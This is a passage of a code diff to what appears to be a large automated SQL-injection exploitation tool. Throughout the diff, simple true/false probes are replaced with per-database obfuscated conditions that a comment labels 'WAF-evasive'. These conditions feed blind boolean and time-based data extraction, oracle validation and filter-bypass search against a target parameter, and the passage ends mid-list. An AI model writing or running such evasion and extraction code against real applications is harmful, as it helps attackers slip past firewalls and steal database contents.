-        _light = self._build_stacked("SELECT 1") if self._stacked else self._build_inline("1=1")
+        _mse_heavy_light_dbms = getattr(self, 'dbms', '') or ''
+        _mse_heavy_light_cond = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":           "ABS(-1e0)>(0e0)",
+            "Sybase":          "ABS(-1e0)>(0e0)",
+            "Oracle":          "NVL(NULL,1e0)>(0e0)",
+            "SQLite":          "MIN(2e0,3e0)>(0e0)",
+            "DB2":             "ABS(-1e0)>(0e0)",
+            "Firebird":        "ABS(-1e0)>(0e0)",
+            "H2":              "ABS(-1e0)>(0e0)",
+            "ClickHouse":      "least(2e0,3e0)>(0e0)",
+            "Informix":        "ABS(-1e0)>(0e0)",
+            "SAP_HANA":        "ABS(-1e0)>(0e0)",
+        }.get(_mse_heavy_light_dbms, "1e0<2e0")
+        _light = self._build_stacked("SELECT 1") if self._stacked else self._build_inline(_mse_heavy_light_cond)
         for _label, _heavy in _heavy_variants:
 
             _, ms_h = await self._timed(_heavy)
@@ -132691,10 +133170,30 @@ class MultiStrategyExtractor:
     async def probe_all(self):
         """Probe all 8 oracles, return ranked list of working ones."""
         # Measure actual baseline response time (3 probes)
+        _pa_dbms = getattr(self, 'dbms', '') or ''
+        _pa_true_cond = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":           "ABS(-1e0)>(0e0)",
+            "Sybase":          "ABS(-1e0)>(0e0)",
+            "Oracle":          "NVL(NULL,1e0)>(0e0)",
+            "SQLite":          "MIN(2e0,3e0)>(0e0)",
+            "DB2":             "ABS(-1e0)>(0e0)",
+            "Firebird":        "ABS(-1e0)>(0e0)",
+            "H2":              "ABS(-1e0)>(0e0)",
+            "ClickHouse":      "least(2e0,3e0)>(0e0)",
+            "Informix":        "ABS(-1e0)>(0e0)",
+            "SAP_HANA":        "ABS(-1e0)>(0e0)",
+        }.get(_pa_dbms, "1e0<2e0")
         _base_times = []
         for _ in range(3):
             _, _bms = await self._timed(self._build_stacked("SELECT 1") if self._stacked
-                                        else self._build_inline("1=1"))
+                                        else self._build_inline(_pa_true_cond))
             if _bms > 30:
                 _base_times.append(_bms)
             await asyncio.sleep(0.2)
@@ -132989,9 +133488,48 @@ class MultiStrategyExtractor:
             # FIX: Added T/TH/HQ — timing-detected injections also get boolean body-diff oracle.
             # Previously HQ detection always got no oracle in MSE because HQ was not in this list.
             try:
-                _bbd_fp_t, _ = await self._timed(self._build_inline("1=1"))
+                _bbd_dbms = getattr(self, 'dbms', '') or ''
+                _bbd_true_cond = {
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                    "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                    "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                    "MSSQL":           "ABS(-1e0)>(0e0)",
+                    "Sybase":          "ABS(-1e0)>(0e0)",
+                    "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                    "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                    "DB2":             "ABS(-1e0)>(0e0)",
+                    "Firebird":        "ABS(-1e0)>(0e0)",
+                    "H2":              "ABS(-1e0)>(0e0)",
+                    "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                    "Informix":        "ABS(-1e0)>(0e0)",
+                    "SAP_HANA":        "ABS(-1e0)>(0e0)",
+                }.get(_bbd_dbms, "1e0<2e0")
+                _bbd_false_cond = {
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+                    "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+                    "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+                    "MSSQL":           "ABS(-1e0)<(0e0)",
+                    "Sybase":          "ABS(-1e0)<(0e0)",
+                    "Oracle":          "NVL(NULL,1e0)<(0e0)",
+                    "SQLite":          "MIN(2e0,3e0)<(0e0)",
+                    "DB2":             "ABS(-1e0)<(0e0)",
+                    "Firebird":        "ABS(-1e0)<(0e0)",
+                    "H2":              "ABS(-1e0)<(0e0)",
+                    "ClickHouse":      "least(2e0,3e0)<(0e0)",
+                    "Informix":        "ABS(-1e0)<(0e0)",
+                    "SAP_HANA":        "ABS(-1e0)<(0e0)",
+                }.get(_bbd_dbms, "2e0<1e0")
+                _bbd_fp_t, _ = await self._timed(self._build_inline(_bbd_true_cond))
                 await asyncio.sleep(0.3)
-                _bbd_fp_f, _ = await self._timed(self._build_inline("1=2"))
+                _bbd_fp_f, _ = await self._timed(self._build_inline(_bbd_false_cond))
                 _bbd_body_t = len(getattr(_bbd_fp_t, 'body', b'') or b'') if _bbd_fp_t else 0
                 _bbd_body_f = len(getattr(_bbd_fp_f, 'body', b'') or b'') if _bbd_fp_f else 0
                 _bbd_gap = abs(_bbd_body_t - _bbd_body_f)
@@ -133122,7 +133660,46 @@ class MultiStrategyExtractor:
             except Exception as e:
                 print(f"[MSE]  {name} (error: {e})", flush=True)
 
-        #  Validation: confirm with 1=1/1=2 AND real extraction condition 
+        #  Validation: confirm with WAF-evasive conditions AND real extraction condition
+        _mse_val_dbms = getattr(self, 'dbms', '') or ''
+        _mse_val_true = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":           "ABS(-1e0)>(0e0)",
+            "Sybase":          "ABS(-1e0)>(0e0)",
+            "Oracle":          "NVL(NULL,1e0)>(0e0)",
+            "SQLite":          "MIN(2e0,3e0)>(0e0)",
+            "DB2":             "ABS(-1e0)>(0e0)",
+            "Firebird":        "ABS(-1e0)>(0e0)",
+            "H2":              "ABS(-1e0)>(0e0)",
+            "ClickHouse":      "least(2e0,3e0)>(0e0)",
+            "Informix":        "ABS(-1e0)>(0e0)",
+            "SAP_HANA":        "ABS(-1e0)>(0e0)",
+        }.get(_mse_val_dbms, "1e0<2e0")
+        _mse_val_false = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+            "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+            "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+            "MSSQL":           "ABS(-1e0)<(0e0)",
+            "Sybase":          "ABS(-1e0)<(0e0)",
+            "Oracle":          "NVL(NULL,1e0)<(0e0)",
+            "SQLite":          "MIN(2e0,3e0)<(0e0)",
+            "DB2":             "ABS(-1e0)<(0e0)",
+            "Firebird":        "ABS(-1e0)<(0e0)",
+            "H2":              "ABS(-1e0)<(0e0)",
+            "ClickHouse":      "least(2e0,3e0)<(0e0)",
+            "Informix":        "ABS(-1e0)<(0e0)",
+            "SAP_HANA":        "ABS(-1e0)<(0e0)",
+        }.get(_mse_val_dbms, "2e0<1e0")
         _validated = []
         for name in self._oracles:
             if name not in self._oracle_fns:
@@ -133131,9 +133708,9 @@ class MultiStrategyExtractor:
             try:
                 _fn = self._oracle_fns[name]
                 # Round 1: basic boolean
-                r1 = await asyncio.wait_for(_fn("1=1"), timeout=20)
+                r1 = await asyncio.wait_for(_fn(_mse_val_true), timeout=20)
                 await asyncio.sleep(0.2)
-                r2 = await asyncio.wait_for(_fn("1=2"), timeout=20)
+                r2 = await asyncio.wait_for(_fn(_mse_val_false), timeout=20)
                 if not (r1 and not r2):
                     # FIX-BUG4: Detect WAF-corruption: when the WAF returns the same 4xx
                     # response for every probe (true and false), both r1 and r2 may be True.
@@ -133146,13 +133723,13 @@ class MultiStrategyExtractor:
                     if r2:  # r2 True suggests WAF or oracle corruption
                         try:
                             await asyncio.sleep(0.1)
-                            _r3_waf = await asyncio.wait_for(_fn("2=3"), timeout=20)
+                            _r3_waf = await asyncio.wait_for(_fn(_mse_val_false), timeout=20)
                         except Exception:
                             pass
                     if r2 and _r3_waf:
-                        print(f"[MSE]  {name} WAF-corrupted (1=1→{r1}, 1=2→{r2}, 2=3→{_r3_waf}) — all conditions return True; oracle unusable on this target", flush=True)
+                        print(f"[MSE]  {name} WAF-corrupted (true→{r1}, false→{r2}, false2→{_r3_waf}) — all conditions return True; oracle unusable on this target", flush=True)
                     else:
-                        print(f"[MSE]  {name} basic validation FAILED (1=1→{r1}, 1=2→{r2})", flush=True)
+                        print(f"[MSE]  {name} basic validation FAILED (true→{r1}, false→{r2})", flush=True)
                     # Cache this failure so future MSE instances skip re-probing
                     if not hasattr(self.config, "_mse_oracle_blacklist"):
                         self.config._mse_oracle_blacklist = set()
@@ -133497,7 +134074,27 @@ class MultiStrategyExtractor:
                 "commentbeforeparens", "keywordsplit", "randomnoise",
                 "randomcomments", "versionedkeywords",
                 "between", "greatest", "numericobfuscate", "charencode"]
-        _baseline_p = self._build_stacked("SELECT 1") if self._stacked else self._build_inline("1=1")
+        _td_dbms = getattr(self, 'dbms', '') or ''
+        _td_true_cond = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":           "ABS(-1e0)>(0e0)",
+            "Sybase":          "ABS(-1e0)>(0e0)",
+            "Oracle":          "NVL(NULL,1e0)>(0e0)",
+            "SQLite":          "MIN(2e0,3e0)>(0e0)",
+            "DB2":             "ABS(-1e0)>(0e0)",
+            "Firebird":        "ABS(-1e0)>(0e0)",
+            "H2":              "ABS(-1e0)>(0e0)",
+            "ClickHouse":      "least(2e0,3e0)>(0e0)",
+            "Informix":        "ABS(-1e0)>(0e0)",
+            "SAP_HANA":        "ABS(-1e0)>(0e0)",
+        }.get(_td_dbms, "1e0<2e0")
+        _baseline_p = self._build_stacked("SELECT 1") if self._stacked else self._build_inline(_td_true_cond)
         _, _base_ms = await self._timed(_baseline_p)
         if _base_ms < 30:
             return []
@@ -133521,7 +134118,7 @@ class MultiStrategyExtractor:
                 else:
                     _test_p = self._build_stacked("SELECT SLEEP(2)")
             else:
-                _test_p = self._build_inline("1=1")
+                _test_p = self._build_inline(_td_true_cond)
             try:
                 _tampered = fn(_test_p)
                 fp, ms = await self._timed(_tampered)
@@ -133579,9 +134176,29 @@ class MultiStrategyExtractor:
                 break
             # If we get an error response (different from baseline), column count exceeded
             if n > 1:
+                _dcn_dbms = getattr(self, 'dbms', '') or ''
+                _dcn_true = {
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                    "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                    "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                    "MSSQL":           "ABS(-1e0)>(0e0)",
+                    "Sybase":          "ABS(-1e0)>(0e0)",
+                    "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                    "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                    "DB2":             "ABS(-1e0)>(0e0)",
+                    "Firebird":        "ABS(-1e0)>(0e0)",
+                    "H2":              "ABS(-1e0)>(0e0)",
+                    "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                    "Informix":        "ABS(-1e0)>(0e0)",
+                    "SAP_HANA":        "ABS(-1e0)>(0e0)",
+                }.get(_dcn_dbms, "1e0<2e0")
                 fp_prev, _ = await self._timed(
                     self._build_stacked(f"SELECT * FROM {sep}{table}{_sep_close} ORDER BY 1 LIMIT 1")
-                    if self._stacked else self._build_inline("1=1"))
+                    if self._stacked else self._build_inline(_dcn_true))
                 _st_prev = getattr(fp_prev, "status_code", None)
                 if _st != _st_prev:
                     _col_count = n - 1
@@ -133771,14 +134388,33 @@ class MultiStrategyExtractor:
         _fail_count = 0
         _oracle_fails = {}  # oracle_name  fail count
 
+        _mse_hc_true_cond = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":           "ABS(-1e0)>(0e0)",
+            "Sybase":          "ABS(-1e0)>(0e0)",
+            "Oracle":          "NVL(NULL,1e0)>(0e0)",
+            "SQLite":          "MIN(2e0,3e0)>(0e0)",
+            "DB2":             "ABS(-1e0)>(0e0)",
+            "Firebird":        "ABS(-1e0)>(0e0)",
+            "H2":              "ABS(-1e0)>(0e0)",
+            "ClickHouse":      "least(2e0,3e0)>(0e0)",
+            "Informix":        "ABS(-1e0)>(0e0)",
+            "SAP_HANA":        "ABS(-1e0)>(0e0)",
+        }.get(self.dbms or "", "1e0<2e0")
         for pos in range(_start_pos, max_len + 1):
             # Health check + jitter profiling
             if pos % _health_interval == 0 and pos > 1:
-                _hc = await self.eval_condition("1=1")
+                _hc = await self.eval_condition(_mse_hc_true_cond)
                 if not _hc:
                     print(f"[MSE]   Health check failed at pos={pos}", flush=True)
                     await asyncio.sleep(2)
-                    _hc2 = await self.eval_condition("1=1")
+                    _hc2 = await self.eval_condition(_mse_hc_true_cond)
                     if not _hc2:
                         print(f"[MSE]  Oracle dead  saving progress and stopping at {prefix!r}", flush=True)
                         self._save_progress(_label, prefix)
@@ -133788,7 +134424,7 @@ class MultiStrategyExtractor:
                 if hasattr(self, "_sleep_info") and self._sleep_info:
                     _jitter_samples = []
                     for _ in range(3):
-                        _jp = self._build_stacked("SELECT 1") if self._stacked else self._build_inline("1=1")
+                        _jp = self._build_stacked("SELECT 1") if self._stacked else self._build_inline(_mse_hc_true_cond)
                         _, _jms = await self._timed(_jp)
                         if _jms > 30:
                             _jitter_samples.append(_jms)
@@ -134299,13 +134935,32 @@ class MultiStrategyExtractor:
         # column data and a single space is kept while 3+ consecutive are treated as EOS.
         _eft_space_streak = 0
 
+        _eft_hc_true_cond = {
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":           "ABS(-1e0)>(0e0)",
+            "Sybase":          "ABS(-1e0)>(0e0)",
+            "Oracle":          "NVL(NULL,1e0)>(0e0)",
+            "SQLite":          "MIN(2e0,3e0)>(0e0)",
+            "DB2":             "ABS(-1e0)>(0e0)",
+            "Firebird":        "ABS(-1e0)>(0e0)",
+            "H2":              "ABS(-1e0)>(0e0)",
+            "ClickHouse":      "least(2e0,3e0)>(0e0)",
+            "Informix":        "ABS(-1e0)>(0e0)",
+            "SAP_HANA":        "ABS(-1e0)>(0e0)",
+        }.get(self.dbms or "", "1e0<2e0")
         for pos in range(_start_pos, max_len + 1):
             # Health check every 5 chars
             if pos % 5 == 0 and pos > 1:
-                _hc = await self.eval_condition("1=1")
+                _hc = await self.eval_condition(_eft_hc_true_cond)
                 if not _hc:
                     await asyncio.sleep(2)
-                    if not await self.eval_condition("1=1"):
+                    if not await self.eval_condition(_eft_hc_true_cond):
                         self._save_progress(_label, prefix)
                         break
 
@@ -137014,10 +137669,49 @@ class ExtractionBypassFinder:
         templates  = self.templates(self.dbms, self.t)
         wrappers   = self.condition_wrappers(self.dbms)
 
+        _ebf_p1_dbms = self.dbms or ''
+        _ebf_p1_true = {
+            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":          "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":        "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":           "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":          "ABS(-1e0)>(0e0)",
+            "Sybase":         "ABS(-1e0)>(0e0)",
+            "DB2":            "ABS(-1e0)>(0e0)",
+            "Firebird":       "ABS(-1e0)>(0e0)",
+            "H2":             "ABS(-1e0)>(0e0)",
+            "Informix":       "ABS(-1e0)>(0e0)",
+            "SAP_HANA":       "ABS(-1e0)>(0e0)",
+            "Oracle":         "NVL(NULL,1e0)>(0e0)",
+            "SQLite":         "MIN(2e0,3e0)>(0e0)",
+            "ClickHouse":     "least(2e0,3e0)>(0e0)",
+        }.get(_ebf_p1_dbms, "1e0<2e0")
+        _ebf_p1_false = {
+            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "MySQL":          "GREATEST(2e0,3e0)<(0e0)",
+            "MariaDB":        "GREATEST(2e0,3e0)<(0e0)",
+            "TiDB":           "GREATEST(2e0,3e0)<(0e0)",
+            "MSSQL":          "ABS(-1e0)<(0e0)",
+            "Sybase":         "ABS(-1e0)<(0e0)",
+            "DB2":            "ABS(-1e0)<(0e0)",
+            "Firebird":       "ABS(-1e0)<(0e0)",
+            "H2":             "ABS(-1e0)<(0e0)",
+            "Informix":       "ABS(-1e0)<(0e0)",
+            "SAP_HANA":       "ABS(-1e0)<(0e0)",
+            "Oracle":         "NVL(NULL,1e0)<(0e0)",
+            "SQLite":         "MIN(2e0,3e0)<(0e0)",
+            "ClickHouse":     "least(2e0,3e0)<(0e0)",
+        }.get(_ebf_p1_dbms, "2e0<1e0")
         for tmpl in templates:
-            cal_payload = tmpl.format(cond="1=1")
+            cal_payload = tmpl.format(cond=_ebf_p1_true)
             for (mutated, tc) in self.mutate(cal_payload, self.t):
-                #  Phase 1: structural bypass test 
+                #  Phase 1: structural bypass test
                 t0 = time.monotonic()
                 try:
                     await _send_injected(
@@ -137035,7 +137729,7 @@ class ExtractionBypassFinder:
                 try:
                     await _send_injected(
                         self.engine, self.method, self.url, self.data, self.data_fmt,
-                        self.param, self.original + tmpl.format(cond="1=2"), tc)
+                        self.param, self.original + tmpl.format(cond=_ebf_p1_false), tc)
                 except Exception: pass
                 _elapsed_false = (time.monotonic() - _t0f) * 1000
                 thresh = (_elapsed_false + elapsed) / 2
@@ -137079,11 +137773,11 @@ class ExtractionBypassFinder:
                         except Exception: pass
                         _ew = (time.monotonic() - _t0w) * 1000
                         if _ew > thresh:
-                            # Double-blind confirmation: verify 1=2 (always false)
+                            # Double-blind confirmation: verify always-false condition
                             # returns BELOW threshold with this wrapper.
                             # If rate-limiting is causing all responses to be slow,
                             # the false condition will also be slow  reject.
-                            _false_cond = _wrap.format(cond="1=2")
+                            _false_cond = _wrap.format(cond=_ebf_p1_false)
                             _false_p    = tmpl.format(cond=_false_cond)
                             _t0_false = time.monotonic()
                             try:
@@ -137878,7 +138572,27 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             return ms > min(_t_heuristic, _t_sleep_rel)
 
         # Strategy 0: standard form
-        _std_ms = await _calibrate_probe(timing_payload("1=1"), tamper_chain)
+        _tb_cal_dbms = dbms or ''
+        _tb_cal_true = {
+            "PostgreSQL":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "CockroachDB":    "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "YugabyteDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "Amazon Redshift":"ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "MySQL":          "LEAST(2e0,3e0)>(0e0)",
+            "MariaDB":        "LEAST(2e0,3e0)>(0e0)",
+            "TiDB":           "LEAST(2e0,3e0)>(0e0)",
+            "MSSQL":          "ABS(-1e0)>(0e0)",
+            "Sybase":         "ABS(-1e0)>(0e0)",
+            "DB2":            "ABS(-1e0)>(0e0)",
+            "Firebird":       "ABS(-1e0)>(0e0)",
+            "H2":             "ABS(-1e0)>(0e0)",
+            "Informix":       "ABS(-1e0)>(0e0)",
+            "SAP_HANA":       "ABS(-1e0)>(0e0)",
+            "Oracle":         "NVL(NULL,1e0)>(0e0)",
+            "SQLite":         "MIN(2e0,3e0)>(0e0)",
+            "ClickHouse":     "least(2e0,3e0)>(0e0)",
+        }.get(_tb_cal_dbms, "1e0<2e0")
+        _std_ms = await _calibrate_probe(timing_payload(_tb_cal_true), tamper_chain)
         _std_cal_ok = False
         if _cal_hit(_std_ms):
             timing_thresh = max(_std_ms * 0.75, _base_time + 150)
@@ -138017,7 +138731,7 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # BUG-PERCALL-IMPORT-FIX: unquote already at module level (L9398)
             _dp = unquote(unquote(_det_payload_raw.strip()))
             try:
-                _strategies = SQLPayloadTransformer.all_strategies(_dp, "1=1", t, dbms)
+                _strategies = SQLPayloadTransformer.all_strategies(_dp, _tb_cal_true, t, dbms)
             except Exception as _strat_e:
                 import traceback as _tb2
                 print(f"[!] [TBExtract] all_strategies failed: {_strat_e}", flush=True)
@@ -142699,11 +143413,52 @@ class ExtractionOrchestrator:
         # ── Calibrate once, cache threshold ───────────────────────────────
         if not hasattr(self, '_dt_thresh') or self._dt_thresh is None:
             await asyncio.sleep(2.0)
+            _dt_cal_dbms = (getattr(self.result, 'dbms', '') or
+                            getattr(self.config, 'forced_dbms', None) or
+                            getattr(self.config, 'dbms', None) or '') or ''
+            _dt_cal_true = {
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "MySQL":           "LEAST(2e0,3e0)>(0e0)",
+                "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
+                "TiDB":            "LEAST(2e0,3e0)>(0e0)",
+                "MSSQL":           "ABS(-1e0)>(0e0)",
+                "Sybase":          "ABS(-1e0)>(0e0)",
+                "Oracle":          "NVL(NULL,1e0)>(0e0)",
+                "SQLite":          "MIN(2e0,3e0)>(0e0)",
+                "DB2":             "ABS(-1e0)>(0e0)",
+                "Firebird":        "ABS(-1e0)>(0e0)",
+                "H2":              "ABS(-1e0)>(0e0)",
+                "ClickHouse":      "least(2e0,3e0)>(0e0)",
+                "Informix":        "ABS(-1e0)>(0e0)",
+                "SAP_HANA":        "ABS(-1e0)>(0e0)",
+            }.get(_dt_cal_dbms, "1e0<2e0")
+            _dt_cal_false = {
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
+                "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
+                "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
+                "MSSQL":           "ABS(-1e0)<(0e0)",
+                "Sybase":          "ABS(-1e0)<(0e0)",
+                "Oracle":          "NVL(NULL,1e0)<(0e0)",
+                "SQLite":          "MIN(2e0,3e0)<(0e0)",
+                "DB2":             "ABS(-1e0)<(0e0)",
+                "Firebird":        "ABS(-1e0)<(0e0)",
+                "H2":              "ABS(-1e0)<(0e0)",
+                "ClickHouse":      "least(2e0,3e0)<(0e0)",
+                "Informix":        "ABS(-1e0)<(0e0)",
+                "SAP_HANA":        "ABS(-1e0)<(0e0)",
+            }.get(_dt_cal_dbms, "2e0<1e0")
             _best_margin, _best_ms_t, _best_ms_f = -9999, 0.0, 0.0
             for _cal_round in range(2):
-                _ms_t = await _probe("1=1")
+                _ms_t = await _probe(_dt_cal_true)
                 await asyncio.sleep(_delay)
-                _ms_f = await _probe("1=2")
+                _ms_f = await _probe(_dt_cal_false)
                 _m = _ms_t - _ms_f
                 LOG.info("[DetTemplate] Cal %d: TRUE=%.0fms FALSE=%.0fms margin=%.0fms",
                          _cal_round + 1, _ms_t, _ms_f, _m)
@@ -146152,7 +146907,17 @@ class CacheInferenceOracle:
 
         true_payload = det_payload
         false_payload = None
-        for t, f in [("1=1","1=2"),("'a'='a'","'a'='b'"),("AND 1","AND 0")]:
+        for t, f in [
+            ("1=1","1=2"),("'a'='a'","'a'='b'"),("AND 1","AND 0"),
+            ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+             "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)"),
